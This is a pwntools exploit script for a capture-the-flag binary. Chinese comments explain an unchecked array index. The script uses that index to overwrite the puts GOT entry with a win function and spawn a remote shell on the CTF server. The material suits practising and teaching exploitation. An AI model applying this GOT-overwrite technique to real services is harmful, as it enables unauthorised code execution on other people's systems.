from pwn import *

context.binary = e = ELF('portal_gun', checksec=False)

HOST, PORT = 'ctf.adl.tw', 10008

# ============================================================
# 漏洞：陣列索引沒有邊界檢查 -> 任意位址 8-byte 寫入
#
#   int n;
#   scanf("%d", &n);                     // "Enter dimension index: "
#   if (n == 0x89 || n == -0x89) puts(easter_egg);   // 只是彩蛋，不是邊界檢查
#   scanf("%lld", &dimensions[n]);       // "Insert portal fluid calibration..."
#
# `dimensions` 是 .bss 裡一個固定位址的全域陣列（No PIE，位址寫死），
# 每個元素 8 bytes。`n` 完全沒有限制範圍（可正可負），所以
# `&dimensions[n] == dimensions_base + n*8` 可以被我們精準算成
# "任何 8-byte 對齊、離 dimensions_base 是 8 的倍數" 的位址 --
# 包括 GOT 裡的任何一格。第二個 scanf 用 "%lld" 寫 8 bytes，
# 剛好可以把一個函式指標完整蓋成我們要的任意位址。
#
# 二進位本身帶了一個現成的 win function：
#   szechuan_sauce() -> puts(...); putchar('\n'); execve("/bin/sh", NULL, NULL);
#
# 攻擊：把 got.puts 蓋成 szechuan_sauce 的位址，main() 結尾剛好還會
# 再呼叫一次 puts()（印最後一句台詞），這次呼叫就會被劫持，
# 跳去執行 szechuan_sauce()，拿到 shell。
# ============================================================

WIN_FUNC = 0x40125b            # szechuan_sauce()
GOT_PUTS = e.got['puts']
DIMENSIONS_BASE = e.symbols['dimensions']

INDEX = (GOT_PUTS - DIMENSIONS_BASE) // 8   # -16
assert DIMENSIONS_BASE + INDEX * 8 == GOT_PUTS

p = remote(HOST, PORT, timeout=10)

p.recvuntil(b'Enter dimension index: ')
p.sendline(str(INDEX).encode())

p.recvuntil(b'Insert portal fluid calibration frequency: ')
p.sendline(str(WIN_FUNC).encode())

p.interactive()
